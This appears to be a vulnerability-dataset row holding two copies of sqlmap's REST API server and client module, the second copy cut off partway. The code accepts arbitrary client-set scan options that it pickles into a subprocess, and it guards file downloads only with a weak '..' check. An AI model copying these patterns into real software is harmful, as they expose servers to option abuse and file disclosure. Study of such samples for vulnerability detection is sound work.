        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug(""REST-JSON API %s connected to IPC database"" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not ""locked"" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith(""SELECT""):
            return self.cursor.fetchall()

    def init(self):
        self.execute(""CREATE TABLE logs(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, time TEXT, ""
                  ""level TEXT, message TEXT""
                  "")"")

        self.execute(""CREATE TABLE data(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, status INTEGER, ""
                  ""content_type INTEGER, value TEXT""
                  "")"")

        self.execute(""CREATE TABLE errors(""
                    ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                    ""taskid INTEGER, error TEXT""
                    "")"")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {""boolean"": False, ""string"": None, ""integer"": None, ""float"": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists(""sqlmap.py""):
            self.process = Popen([""python"", ""sqlmap.py"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen([""sqlmap"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype=""stdout""):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == ""stdout"":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == ""stdout"":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                ""SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?"",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute(""DELETE FROM data WHERE id = ?"",
                                                     (output[index][0],))

                conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = ""%s%s"" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute(""UPDATE data SET value = ? WHERE id = ?"",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute(""INSERT INTO errors VALUES(NULL, ?, ?)"",
                                         (self.taskid, str(value) if value else """"))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """"""
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """"""
        conf.database_cursor.execute(""INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)"",
                                     (conf.taskid, time.strftime(""%X""), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, ""api""):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect(""client"")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, ""%s ('%s')"" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook(""after_request"")
def security_headers(json_header=True):
    """"""
    Set some headers across all HTTP responses
    """"""
    response.headers[""Server""] = ""Server""
    response.headers[""X-Content-Type-Options""] = ""nosniff""
    response.headers[""X-Frame-Options""] = ""DENY""
    response.headers[""X-XSS-Protection""] = ""1; mode=block""
    response.headers[""Pragma""] = ""no-cache""
    response.headers[""Cache-Control""] = ""no-cache""
    response.headers[""Expires""] = ""0""
    if json_header:
        response.content_type = ""application/json; charset=UTF-8""

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return ""Access denied""


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return ""Nothing here""


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return ""Method not allowed""


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return ""Internal server error""

#############################
# Task management functions #
#############################


# Users' methods
@get(""/task/new"")
def task_new():
    """"""
    Create new task ID
    """"""
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug(""Created new task: '%s'"" % taskid)
    return jsonize({""success"": True, ""taskid"": taskid})


@get(""/task/<taskid>/delete"")
def task_delete(taskid):
    """"""
    Delete own task ID
    """"""
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug(""[%s] Deleted task"" % taskid)
        return jsonize({""success"": True})
    else:
        logger.warning(""[%s] Invalid task ID provided to task_delete()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

###################
# Admin functions #
###################


@get(""/admin/<taskid>/list"")
def task_list(taskid=None):
    """"""
    List task pull
    """"""
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))[""status""]

    logger.debug(""[%s] Listed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True, ""tasks"": tasks, ""tasks_num"": len(tasks)})

@get(""/admin/<taskid>/flush"")
def task_flush(taskid):
    """"""
    Flush task spool (delete all tasks)
    """"""

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug(""[%s] Flushed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get(""/option/<taskid>/list"")
def option_list(taskid):
    """"""
    List options for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_list()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    logger.debug(""[%s] Listed task options"" % taskid)
    return jsonize({""success"": True, ""options"": DataStore.tasks[taskid].get_options()})


@post(""/option/<taskid>/get"")
def option_get(taskid):
    """"""
    Get the value of an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_get()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    option = request.json.get(""option"", """")

    if option in DataStore.tasks[taskid].options:
        logger.debug(""[%s] Retrieved value for option %s"" % (taskid, option))
        return jsonize({""success"": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug(""[%s] Requested value for unknown option %s"" % (taskid, option))
        return jsonize({""success"": False, ""message"": ""Unknown option"", option: ""not set""})


@post(""/option/<taskid>/set"")
def option_set(taskid):
    """"""
    Set an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_set()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug(""[%s] Requested to set options"" % taskid)
    return jsonize({""success"": True})


# Handle scans
@post(""/scan/<taskid>/start"")
def scan_start(taskid):
    """"""
    Launch a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_start()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug(""[%s] Started scan"" % taskid)
    return jsonize({""success"": True, ""engineid"": DataStore.tasks[taskid].engine_get_id()})


@get(""/scan/<taskid>/stop"")
def scan_stop(taskid):
    """"""
    Stop a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_stop()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_stop()

    logger.debug(""[%s] Stopped scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/kill"")
def scan_kill(taskid):
    """"""
    Kill a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_kill()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_kill()

    logger.debug(""[%s] Killed scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/status"")
def scan_status(taskid):
    """"""
    Returns status of a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_status()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if DataStore.tasks[taskid].engine_process() is None:
        status = ""not running""
    else:
        status = ""terminated"" if DataStore.tasks[taskid].engine_has_terminated() is True else ""running""

    logger.debug(""[%s] Retrieved scan status"" % taskid)
    return jsonize({
        ""success"": True,
        ""status"": status,
        ""returncode"": DataStore.tasks[taskid].engine_get_returncode()
    })


@get(""/scan/<taskid>/data"")
def scan_data(taskid):
    """"""
    Retrieve the data of a scan
    """"""
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_data()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            ""SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_data_message.append(
            {""status"": status, ""type"": content_type, ""value"": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            ""SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug(""[%s] Retrieved scan data and error messages"" % taskid)
    return jsonize({""success"": True, ""data"": json_data_message, ""error"": json_errors_message})


# Functions to handle scans' logs
@get(""/scan/<taskid>/log/<start>/<end>"")
def scan_log_limited(taskid, start, end):
    """"""
    Retrieve a subset of log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning(""[%s] Invalid start or end value provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid start or end value, must be digits""})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            (""SELECT time, level, message FROM logs WHERE ""
             ""taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC""),
            (taskid, start, end)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages subset"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


@get(""/scan/<taskid>/log"")
def scan_log(taskid):
    """"""
    Retrieve the log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ""SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC"", (taskid,)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


# Function to handle files inside the output directory
@get(""/download/<taskid>/<target>/<filename:path>"")
def download(taskid, target, filename):
    """"""
    Download a certain file from the file system
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to download()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Prevent file path traversal - the lame way
    if "".."" in target:
        logger.warning(""[%s] Forbidden path (%s)"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""Forbidden path""})

    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)

    if os.path.exists(path):
        logger.debug(""[%s] Retrieved content of file %s"" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({""success"": True, ""file"": file_content.encode(""base64"")})
    else:
        logger.warning(""[%s] File does not exist %s"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""File does not exist""})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """"""
    REST-JSON API server
    """"""
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix=""sqlmapipc-"", text=False)[1]

    logger.info(""Running REST-JSON API server at '%s:%d'.."" % (host, port))
    logger.info(""Admin ID: %s"" % DataStore.admin_id)
    logger.debug(""IPC database: %s"" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == ""gevent"":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == ""eventlet"":
            import eventlet
            eventlet.monkey_patch()
        logger.debug(""Using adapter '%s' to run bottle"" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if ""already in use"" in getSafeExString(ex):
            logger.error(""Address already in use ('%s:%s')"" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = ""Adapter '%s' is not available on this system"" % adapter
        if adapter in (""gevent"", ""eventlet""):
            errMsg += "" (e.g.: 'sudo apt-get install python-%s')"" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug(""Calling %s"" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error(""Failed to load and parse %s"" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """"""
    REST-JSON API client
    """"""

    dbgMsg = ""Example client access from command line:""
    dbgMsg += ""\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid"" % (host, port)
    dbgMsg += ""\n\t$ curl -H \""Content-Type: application/json\"" -X POST -d '{\""url\"": \""http://testphp.vulnweb.com/artists.php?artist=1\""}' http://%s:%d/scan/$taskid/start"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/data"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/log"" % (host, port)
    logger.debug(dbgMsg)

    addr = ""http://%s:%d"" % (host, port)
    logger.info(""Starting REST-JSON API client to '%s'..."" % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = ""There has been a problem while connecting to the ""
            errMsg += ""REST-JSON API server at '%s' "" % addr
            errMsg += ""(%s)"" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info(""Type 'help' or '?' for list of available commands"")

    while True:
        try:
            command = raw_input(""api%s> "" % ("" (%s)"" % taskid if taskid else """")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in (""data"", ""log"", ""status"", ""stop"", ""kill""):
            if not taskid:
                logger.error(""No task ID in use"")
                continue
            raw = _client(""%s/scan/%s/%s"" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            dataToStdout(""%s\n"" % raw)

        elif command.startswith(""new""):
            if ' ' not in command:
                logger.error(""Program arguments are missing"")
                continue

            argv = [""sqlmap.py""] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client(""%s/task/new"" % addr)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to create new task"")
                continue
            taskid = res[""taskid""]
            logger.info(""New task ID is '%s'"" % taskid)

            raw = _client(""%s/scan/%s/start"" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to start scan"")
                continue
            logger.info(""Scanning started"")

        elif command.startswith(""use""):
            taskid = (command.split()[1] if ' ' in command else """").strip(""'\"""")
            if not taskid:
                logger.error(""Task ID is missing"")
                taskid = None
                continue
            elif not re.search(r""\A[0-9a-fA-F]{16}\Z"", taskid):
                logger.error(""Invalid task ID '%s'"" % taskid)
                taskid = None
                continue
            logger.info(""Switching to task ID '%s' "" % taskid)

        elif command in (""list"", ""flush""):
            raw = _client(""%s/admin/%s/%s"" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            elif command == ""flush"":
                taskid = None
            dataToStdout(""%s\n"" % raw)

        elif command in (""exit"", ""bye"", ""quit"", 'q'):
            return

        elif command in (""help"", ""?""):
            msg =  ""help        Show this help message\n""
            msg += ""new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \""http://testphp.vulnweb.com/artists.php?artist=1\""')\n""
            msg += ""use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n""
            msg += ""data        Retrieve and show data for current task\n""
            msg += ""log         Retrieve and show log for current task\n""
            msg += ""status      Retrieve and show status for current task\n""
            msg += ""stop        Stop current task\n""
            msg += ""kill        Kill current task\n""
            msg += ""list        Display all tasks\n""
            msg += ""flush       Flush tasks (delete all tasks)\n""
            msg += ""exit        Exit this client\n""

            dataToStdout(msg)

        elif command:
            logger.error(""Unknown command '%s'"" % command)
/n/n/n",1
56,b4bb4c393b26072b9a47f787be134888b983af60,"lib/utils/api.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
""""""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = """"
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who=""server""):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug(""REST-JSON API %s connected to IPC database"" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not ""locked"" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith(""SELECT""):
            return self.cursor.fetchall()

    def init(self):
        self.execute(""CREATE TABLE logs(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, time TEXT, ""
                  ""level TEXT, message TEXT""
                  "")"")

        self.execute(""CREATE TABLE data(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, status INTEGER, ""
                  ""content_type INTEGER, value TEXT""
                  "")"")

        self.execute(""CREATE TABLE errors(""
                    ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                    ""taskid INTEGER, error TEXT""
                    "")"")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {""boolean"": False, ""string"": None, ""integer"": None, ""float"": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists(""sqlmap.py""):
            self.process = Popen([""python"", ""sqlmap.py"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen([""sqlmap"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype=""stdout""):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == ""stdout"":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == ""stdout"":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                ""SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?"",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute(""DELETE FROM data WHERE id = ?"",
                                                     (output[index][0],))

                conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = ""%s%s"" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute(""UPDATE data SET value = ? WHERE id = ?"",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute(""INSERT INTO errors VALUES(NULL, ?, ?)"",
                                         (self.taskid, str(value) if value else """"))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """"""
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """"""
        conf.database_cursor.execute(""INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)"",
                                     (conf.taskid, time.strftime(""%X""), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, ""api""):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect(""client"")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, ""%s ('%s')"" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook(""after_request"")
def security_headers(json_header=True):
    """"""
    Set some headers across all HTTP responses
    """"""
    response.headers[""Server""] = ""Server""
    response.headers[""X-Content-Type-Options""] = ""nosniff""
    response.headers[""X-Frame-Options""] = ""DENY""
    response.headers[""X-XSS-Protection""] = ""1; mode=block""
    response.headers[""Pragma""] = ""no-cache""
    response.headers[""Cache-Control""] = ""no-cache""
    response.headers[""Expires""] = ""0""
    if json_header:
        response.content_type = ""application/json; charset=UTF-8""

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return ""Access denied""


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return ""Nothing here""


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return ""Method not allowed""


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return ""Internal server error""

#############################
# Task management functions #
#############################


# Users' methods
@get(""/task/new"")
def task_new():
    """"""
    Create new task ID
    """"""
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug(""Created new task: '%s'"" % taskid)
    return jsonize({""success"": True, ""taskid"": taskid})


@get(""/task/<taskid>/delete"")
def task_delete(taskid):
    """"""
    Delete own task ID
    """"""
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug(""[%s] Deleted task"" % taskid)
        return jsonize({""success"": True})
    else:
        logger.warning(""[%s] Invalid task ID provided to task_delete()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

###################
# Admin functions #
###################


@get(""/admin/<taskid>/list"")
def task_list(taskid=None):
    """"""
    List task pull
    """"""
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))[""status""]

    logger.debug(""[%s] Listed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True, ""tasks"": tasks, ""tasks_num"": len(tasks)})

@get(""/admin/<taskid>/flush"")
def task_flush(taskid):
    """"""
    Flush task spool (delete all tasks)
    """"""

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

